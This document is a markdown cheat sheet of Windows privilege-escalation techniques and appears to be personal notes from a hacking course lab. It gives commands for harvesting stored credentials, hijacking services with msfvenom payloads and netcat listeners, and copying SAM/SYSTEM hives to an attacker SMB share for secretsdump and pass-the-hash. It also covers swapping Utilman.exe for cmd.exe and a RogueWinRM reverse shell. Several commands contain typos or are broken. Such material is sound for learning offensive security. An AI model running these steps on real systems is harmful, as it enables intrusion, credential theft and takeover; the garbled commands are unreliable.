# Here we go!

Depending on the situation, we might need to abuse some of the following weaknesses:

+ **Misconfigurations on Windows services or scheduled tasks**
+ **Excessive privileges assigned to our account**
+ **Vulnerable software**
+ **Missing Windows security patches**


## Windows Users
Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:

+ `Administrators`	These users have the most privileges. They can change any system configuration parameter and access any file in the system.
+ `Standard Users`	These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

+ `SYSTEM / LocalSystem` An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
+ `Local Service` Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
+ `Network Service` Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


## Unattended Windows Installation
When administrators use Windows Deployment Services which allows for a single operating system image to be deployed to several hosts through the network., the result night end up being stored in the machine in the gfollowing locations:
+ C:\Unattend.xml
+ C:\Windows\Panther\Unattend.xml
+ C:\Windows\Panther\Unattend\Unattend.xml
+ C:\Windows\system32\sysprep.inf
+ C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:
```
Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```


## Powershell History
+ CMD: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
+ Powershell: `type  $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`


## Saved Windows credentials
+ List saved credentials: `cmdkey /list`
+ Use saved credentials: `runas /savecred /user:admin <command>`


## IIS Configuration
IIS Web site configuration file can be located in:
+ C:\inetpub\wwwroot\web.config
+ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file:
`type \path\to\web.conf | findstr connectionString`


## Retrieve Credentials from Software: PuTTY
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


## Scheduled tasks
1. Identify scheduled tasks using the command `schtasks` example:
    ```
    schtasks /query /tn vulntask /fo list /v
    ```
2. Then check if you can edit the `Task to Run` so that you can elevate your privilege and act as the user `Run As User`:
    ```
    icacls \path\to\task\to\run
    ```
3.  Edit the task to run with a reverse shell
4.  If you can start the task manually to save time: `
    ```
    chtasks /run /tn vulntask
    ```


## AlwaysInstallElevated


## Windows Services
+ Windows services are managed by **Service Control Manager(SCM)** . `sc` is a command line program used to communicate with SCM. E.g To check configuration of the service AppHOstSvc: `sc qc apphostsvc`
+ With powershell use `sc.exe`
+ All services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`


## Insecure Permissions on Service Executable
1. List services with `sc` and look for ine that may have weak permissions set
2. Verify permissions of selected services:
   ```
   icacls \path\to\service\exec\file
   ```
3. Generate appropriate paylod and transfert it to the target with
   ```
   msfvenom -p <payload> -f exe-service -o <name>.exe LHOST=<ip> LPORT=<port>
   ```
4. Set up the listener
   ```
   nc -lvnp <port>
   ```
5. Download the payload, install it and give him appropriate permissions so that it can be executed by SCM
   ```
   icacls <\Path\to\executable\payload> /grant Everyine:F`
   ```
7. Restart the service if you can or wait the start
   ```
   sc stop <service_name>
   sc start <service_name>
   ```


## Unquoted Service Paths
1. Idenfity service that path is unquoted and its executable contains spaces
2. Check that you have sufficient privileges to add malicious file to exploit unquoted flaw
3. Generate appropriate paylod and transfert it to the target
4. Set up the listener and download the payload
5.  Install it and give him appropriate permissions so that it can be executed by SCM
6. Restart the service if you can or wait the start    


## Insecure Service Permissions
1. Check that the service has DACL that allow you to modify its configuration. Eg `accesschk64.exe -qlc <service_name>`. You can find accesschk here https://download.sysinternals.com/files/AccessChk.zip
2. Generate appropriate paylod and transfert it to the target
3. Set up the listener and download the payload
4.  Give him appropriate permissions so that it can be executed by SCM
5. Change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
   ```
   sc config <service_name> binPath= "<\Path\to\downloaded\payload.exe>" obj= LocalSystem
   ```
7. Restart the service if you can or wait the start

## Windows Privileges
### SeBackup / SeRestore
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
  1. Verify you have SeBackup and SeRestore privileges with
     ```
     whoami /priv
     ```
  2. Backup SAM and SYSTEM hashes
     ```
     reg save hklm\system\ system.hive
     reg save hklm\sam sam.hive
  3. Start SMB server on your attacker machine with a shared folder eg named share
     ```
      mkdir share && sudo impacket-smbserver -smb2support -username <target_username> -password <target_oassword> pubblic share
     ```
  5. Copy the .hive files from the target to your shared folder
     ```
     copy \Path\to\*.hive \\ip\public
     ```
  6. On your attacker machine retrieve the users'password hashes
     ```
     impacket-secretsdump -sam <sam.hive> -system <system.hive> LOCAL
     ```
  7. Finally we can then use the Administrator's hash to perform Pass-the-Hash attack
     ```
     impacket-psexec -hashes <LMHASH:NTHASH> >username>@<target_ip>
     ```

 ### SeTakeOwnership
The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges

 1. Verify you have SeBackup and SeRestore privileges with
     ```
     whoami /priv
     ```
2. Take the ownership of "utilman.exe”. It can be started by clicking the icon of “Ease of Access” or by using the keyboard shortcut “WinKey+U”. When using one of those methods while the computer is locked, “utilman.exe” is started by “winlogon.exe” with the permissions of the “LocalSystem.
   ```
   takeown /f C:\Windows\System32\Utilman.exe
   ```
3. Gain full access on the file ultilman.exe and replace it with cmd.exe
   ```
   icacls C:\Windows\System32\Utilman.exe /grant <username>:F
   copy C:\Windows\System32\Ucmd.exe C:\Windows\System32\Utilman.exe
   ```
4. Finally lock the account and click on "ease access"

### SeImpersonate / SeAssignPrimaryToken
Those privileges allow the user that get it to impersonate a another user authenticated to a process/service spawned by the user that get the privileges 
1. Identify a process to spawn so that users can connect and authenticate to it for impersonation
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.
The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.
```
RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <IP> <PORT>
```
https://github.com/antonioCoco/RogueWinRM/releases/download/1.1/RogueWinRM.zip


